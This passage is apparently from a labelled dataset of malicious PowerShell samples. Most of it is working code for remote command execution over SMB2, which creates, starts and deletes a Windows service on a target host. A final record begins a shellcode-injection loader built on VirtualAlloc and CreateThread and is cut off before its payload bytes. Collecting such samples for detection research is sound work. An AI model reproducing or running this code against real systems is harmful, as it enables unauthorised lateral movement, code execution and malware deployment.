                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'OpenSCManagerW'
                    }
               
                    'ReadRequest'
                    {

                        Start-Sleep -m $Sleep
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x08,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                        $packet_SMB2_header[""SMB2Header_CreditCharge""] = 0x10,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SMB2_data = Get-PacketSMB2ReadRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }
                        else
                        {
                            $SMB_client_stage = 'StatusPending'
                        }

                    }

                    'StatusPending'
                    {
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if([System.BitConverter]::ToString($SMB_client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $SMB_client_stage = $SMB_client_stage_next
                        }

                    }
                
                    'OpenSCManagerW'
                    {
                        $SMB2_message_ID = 30
                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }

                        $packet_SCM_data = Get-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'CheckAccess'        
                    }

                    'CheckAccess'
                    {

                        if([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($SMB_client_receive[108..127]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')
                        {

                            $SMB_service_manager_context_handle = $SMB_client_receive[108..127]
                            
                            if($SMB_execute -eq $true)
                            {
                                Write-Verbose ""$output_username is a local administrator on $Target""
                                $packet_SCM_data = Get-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                if($SCM_data.Length -lt $SMB_split_index)
                                {
                                    $SMB_client_stage = 'CreateServiceW'
                                }
                                else
                                {
                                    $SMB_client_stage = 'CreateServiceW_First'
                                }

                            }
                            else
                            {
                                Write-Output ""$output_username is a local administrator on $Target""
                                $SMB2_message_ID += 20
                                $SMB_close_service_handle_stage = 2
                                $SMB_client_stage = 'CloseServiceHandle'
                            }

                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[128..131]) -eq '05-00-00-00')
                        {
                            Write-Output ""$output_username is not a local administrator or does not have required privilege on $Target""
                            $SMBExec_failed = $true
                        }
                        else
                        {
                            Write-Output ""Something went wrong with $Target""
                            $SMBExec_failed = $true
                        }

                    }
                
                    'CreateServiceW'
                    {
                        
                        if($SMBExec_command_bytes.Length -lt $SMB_split_index)
                        {
                            $SMB2_message_ID += 20
                            $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                            $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadRequest'
                            $SMB_client_stage_next = 'StartServiceW'
                        }
                        else
                        {
                            
                            
                        }
                    }

                    'CreateServiceW_First'
                    {
                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)
                        $SMB2_message_ID += 20
                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                        
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }

                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]
                        $packet_RPC_data = Get-PacketRPCRequest 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first
                        $packet_RPC_data[""RPCRequest_AllocHint""] = [System.BitConverter]::GetBytes($SCM_data.Length)
                        $SMB_split_index_tracker = $SMB_split_index
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($SMB_split_stage_final -le 2)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_split_stage = 2
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Middle'
                    {
                        $SMB_split_stage++
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                        
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }

                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]
                        $SMB_split_index_tracker += $SMB_split_index
                        $packet_RPC_data = Get-PacketRPCRequest 0x00 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle
                        $packet_RPC_data[""RPCRequest_AllocHint""] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null

                        if($SMB_split_stage -ge $SMB_split_stage_final)
                        {
                            $SMB_client_stage = 'CreateServiceW_Last'
                        }
                        else
                        {
                            $SMB_client_stage = 'CreateServiceW_Middle'
                        }

                    }

                    'CreateServiceW_Last'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                        
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }

                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]
                        $packet_RPC_data = Get-PacketRPCRequest 0x02 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'StartServiceW'
                    }

                    'StartServiceW'
                    {
                    
                        if([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '00-00-00-00')
                        {
                            Write-Verbose ""Service $SMB_service created on $Target""
                            $SMB_service_context_handle = $SMB_client_receive[112..131]
                            $SMB2_message_ID += 20
                            $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                            $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                        
                            if($SMB_signing)
                            {
                                $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                            }

                            $packet_SCM_data = Get-PacketSCMStartServiceW $SMB_service_context_handle
                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                            $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x13,0x00
                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                            $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data   
                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                            $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            if($SMB_signing)
                            {
                                $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                                $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                                $SMB2_signature = $SMB2_signature[0..15]
                                $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                            }

                            $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            Write-Verbose ""Trying to execute command on $Target""
                            $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                            $SMB_client_stream.Flush()
                            $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                            $SMB_client_stage = 'ReadRequest'
                            $SMB_client_stage_next = 'DeleteServiceW'     
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[132..135]) -eq '31-04-00-00')
                        {
                            Write-Output ""Service $SMB_service creation failed on $Target""
                            $SMBExec_failed = $true
                        }
                        else
                        {
                            Write-Output ""Service creation fault context mismatch""
                            $SMBExec_failed = $true
                        }
 
                    }
                
                    'DeleteServiceW'
                    { 

                        if([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '1d-04-00-00')
                        {
                            Write-Output ""Command executed with service $SMB_service on $Target""
                        }
                        elseif([System.BitConverter]::ToString($SMB_client_receive[108..111]) -eq '02-00-00-00')
                        {
                            Write-Output ""Service $SMB_service failed to start on $Target""
                        }

                        $SMB2_message_ID += 20
                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                        
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00
                        }

                        $packet_SCM_data = Get-PacketSCMDeleteServiceW $SMB_service_context_handle
                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'ReadRequest'
                        $SMB_client_stage_next = 'CloseServiceHandle'
                        $SMB_close_service_handle_stage = 1
                    }

                    'CloseServiceHandle'
                    {

                        if($SMB_close_service_handle_stage -eq 1)
                        {
                            Write-Verbose ""Service $SMB_service deleted on $Target""
                            $SMB2_message_ID += 20
                            $SMB_close_service_handle_stage++
                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_context_handle
                        }
                        else
                        {
                            $SMB2_message_ID++
                            $SMB_client_stage = 'CloseRequest'
                            $packet_SCM_data = Get-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle
                        }

                        $packet_SMB2_header = Get-PacketSMB2Header 0x09,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                        $packet_RPC_data = Get-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data 
                        $packet_SMB2_data = Get-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)     
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                    }

                    'CloseRequest'
                    {
                        $SMB2_message_ID += 20
                        $packet_SMB2_header = Get-PacketSMB2Header 0x06,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }
      
                        $packet_SMB2_data = Get-PacketSMB2CloseRequest $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'TreeDisconnect'
                    }

                    'TreeDisconnect'
                    {
                        $SMB2_message_ID++
                        $packet_SMB2_header = Get-PacketSMB2Header 0x04,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }
          
                        $packet_SMB2_data = Get-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Logoff'
                    }

                    'Logoff'
                    {
                        $SMB2_message_ID += 20
                        $packet_SMB2_header = Get-PacketSMB2Header 0x02,0x00 $SMB2_message_ID $SMB2_tree_ID $SMB_session_ID
                        $packet_SMB2_header[""SMB2Header_CreditRequest""] = 0x7f,0x00
                    
                        if($SMB_signing)
                        {
                            $packet_SMB2_header[""SMB2Header_Flags""] = 0x08,0x00,0x00,0x00      
                        }
         
                        $packet_SMB2_data = Get-PacketSMB2SessionLogoffRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = Get-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header[""SMB2Header_Signature""] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $SMB_client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $SMB_client_stream.Write($SMB_client_send,0,$SMB_client_send.Length) > $null
                        $SMB_client_stream.Flush()
                        $SMB_client_stream.Read($SMB_client_receive,0,$SMB_client_receive.Length) > $null
                        $SMB_client_stage = 'Exit'
                    }

                }
                
                if($SMBExec_failed)
                {
                    BREAK SMB_execute_loop
                }
            
            }

        }

    }

    $SMB_client.Close()
    $SMB_client_stream.Close()
}

}",Payload
c0c9d579ceffc7eb9bc8d92af0a4a1dc9dd75c4e91228b36d31898a8182f09f1,"
$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 